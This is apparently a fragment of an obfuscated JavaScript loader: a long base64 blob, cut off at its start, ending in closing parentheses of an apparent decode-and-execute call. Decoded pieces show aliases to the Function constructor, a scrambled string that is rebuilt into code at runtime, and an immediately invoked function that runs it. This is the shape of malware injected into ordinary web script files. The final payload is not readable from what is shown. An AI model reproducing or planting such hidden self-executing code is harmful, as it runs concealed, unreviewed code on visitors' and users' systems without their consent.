hyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
